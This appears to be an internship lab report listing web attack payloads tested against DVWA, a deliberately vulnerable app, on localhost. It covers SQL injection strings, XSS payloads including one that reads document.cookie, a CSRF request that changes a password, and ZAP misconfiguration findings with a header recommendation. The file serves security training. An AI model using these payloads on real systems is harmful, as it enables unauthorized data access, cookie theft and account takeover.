# ========================
#  DVWA Vulnerability Payloads
#  Author: [Your Name]
#  Internship Task: FUTURE_CS_01
# ========================


-------------------------------------
🔍 SECTION 1: SQL Injection (SQLi)
-------------------------------------
Payloads tested:
1. ' OR '1'='1
2. 1' OR 1=1 --
3. ' OR 'x'='x
4. admin'-- 
5. 1 AND 1=1


Target URL:
http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit


-------------------------------------
🛡 SECTION 2: Reflected Cross-Site Scripting (XSS)
-------------------------------------
Payloads tested:
1. <script>alert('XSS')</script>
2. <IMG SRC="javascript:alert('XSS');">
3. <svg/onload=alert('XSS')>
4. "><script>alert(document.cookie)</script>


Target URL:
http://localhost/DVWA/vulnerabilities/xss_r/


-------------------------------------
🔐 SECTION 3: CSRF (Cross-Site Request Forgery)
-------------------------------------
Manual payload submitted:


POST /DVWA/vulnerabilities/csrf/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded


Payload body:
password_new=hackedpass&password_conf=hackedpass&Change=Change


Result:
Password changed without user confirmation (no CSRF protection)


Target URL:
http://localhost/DVWA/vulnerabilities/csrf/


-------------------------------------
🧱 SECTION 4: Security Misconfigurations (ZAP)
-------------------------------------
Alerts generated by OWASP ZAP:
- Missing Anti-CSRF Tokens
- No Content-Security-Policy
- No X-Frame-Options
- Insecure Cookie Flags (No HttpOnly, No Secure, No SameSite)
- Directory Browsing enabled
- Server version exposed via HTTP Headers


Recommendation:
Apply all relevant HTTP security headers and cookie flags as per OWASP best practices.


-------------------------------------
📝 Notes:
- Security Level was set to "Low" in DVWA
- Testing was performed on localhost using Firefox, Burp Suite, and OWASP ZAP


End of file.